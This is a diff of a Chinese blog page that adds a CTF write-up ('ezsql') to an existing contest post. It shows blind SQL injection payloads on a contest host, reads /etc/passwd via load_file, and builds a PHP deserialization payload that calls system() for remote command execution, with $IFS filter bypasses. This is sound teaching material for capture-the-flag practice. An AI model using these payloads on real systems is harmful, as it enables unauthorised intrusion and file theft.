@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">138</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">720</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -404,6 +404,39 @@ height:50vh;
 <p><img src="/2018/11/24/安恒11月月赛/2.png" alt="安恒11月月赛"></p>
 <p>flag直接在上层目录flag{698539765730b69026796420b9201e03}</p>
 <p>也可以参考smile师傅的<a href="https://www.smi1e.top/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwrite-up/" target="_blank" rel="noopener">文章</a></p>
+<h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><p>打开页面，发现只有注册，登录功能，然后就是个人信息页面</p>
+<pre><code>http://101.71.29.5:10024/user/user.php?id=5
+</code></pre><p>随手测试了一下，发现存在sql注入</p>
+<pre><code>http://101.71.29.5:10024/user/user.php?id=if(1,1,2)
+</code></pre><p><img src="/2018/11/24/安恒11月月赛/4.png" alt="安恒11月月赛"></p>
+<pre><code>http://101.71.29.5:10024/user/user.php?id=if(0,1,2)
+</code></pre><p><img src="/2018/11/24/安恒11月月赛/5.png" alt="安恒11月月赛"></p>
+<p>但这里的过滤很坑,首先没有引号，其次是过滤没有回显，我无法通过</p>
+<pre><code>if(length(&apos;a&apos;),1,2)
+</code></pre><p>后来在随便测试的时候发现</p>
+<pre><code>if(hex(database())like(0x25),1,2)
+</code></pre><p><img src="/2018/11/24/安恒11月月赛/6.png" alt="安恒11月月赛"></p>
+<p>回显正常，随即觉得应该有戏，但是由于过滤太多，依次尝试，发现可以load_file</p>
+<pre><code>if((hex(load_file(0x2f6574632f706173737764))like(0x25)),1,2)
+</code></pre><p>尝试读了一下/etc/passwd</p>
+<p>发现成功，于是想到读/var/www/html/index.php</p>
+<p>然后得到文件内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config/sys_config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'CONFIG'</span>]))&#123;</span><br><span class="line">    $config = $_COOKIE[<span class="string">'CONFIG'</span>];</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config/config.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后读/var/www/html/config.php</p>
+<p>得到文件内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    $p=$_GET[<span class="string">'p'</span>];</span><br><span class="line">    $config-&gt;$p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config == <span class="string">""</span>)&#123;</span><br><span class="line">            $config = <span class="keyword">isset</span>($_POST[<span class="string">'config'</span>])?$_POST[<span class="string">'config'</span>]:<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetFilter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line"><span class="comment">//        echo $value;</span></span><br><span class="line">	$value=waf_exec($value); </span><br><span class="line">        var_dump($value);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line">                $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="comment">//var_dump($key);</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现是一波反序列化的操作，注意到函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">       <span class="comment">//var_dump($key);</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>以及<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    $p=$_GET[<span class="string">'p'</span>];</span><br><span class="line">    $config-&gt;$p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现可控值，跟踪SetFilter</p>
+<p>发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$value=waf_exec($value); </span><br><span class="line">       var_dump($value);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">           <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line">               $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br></pre></td></tr></table></figure></p>
+<p>发现可进行RCE的位置，于是尝试构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sky = <span class="keyword">new</span> Config();</span><br><span class="line">$sky-&gt;filter = <span class="keyword">array</span>(<span class="string">'system'</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($sky));</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/24/安恒11月月赛/7.png" alt="安恒11月月赛"></p>
+<p>发现成功列目录，但是在尝试读取flag的时候出现问题</p>
+<p>首先flag2333是个目录，然后/和空格被过滤，我们列出当前文件夹下所有文件</p>
+<p>这里使用$IFS进行绕过空格</p>
+<p><img src="/2018/11/24/安恒11月月赛/8.png" alt="安恒11月月赛"></p>
+<p>得到文件名，依旧无法cat，因为没有/，尝试通配符?，发现也被过滤</p>
+<p>最后想到grep，如下图</p>
+<p><img src="/2018/11/24/安恒11月月赛/9.png" alt="安恒11月月赛"></p>
+<p>即可无需目录名getflag</p>
 
     </article>
     <!-- license  -->
@@ -541,7 +574,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手速要快"><span class="toc-number">1.1.</span> <span class="toc-text">手速要快</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手速要快"><span class="toc-number">1.1.</span> <span class="toc-text">手速要快</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezsql"><span class="toc-number">1.2.</span> <span class="toc-text">ezsql</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1325,9 +1358,24 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 51
+        Total : 52
         </div>
         <!-- search  -->
         
@@ -1340,6 +1388,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2018/12/06/CTF常用脚本整理/" >CTF常用脚本整理</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1601,9 +1654,9 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
@@ -1617,9 +1670,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="problem"><span class="iconfont-archer">&#xe606;</span>problem</span>
     
-        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
-    
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
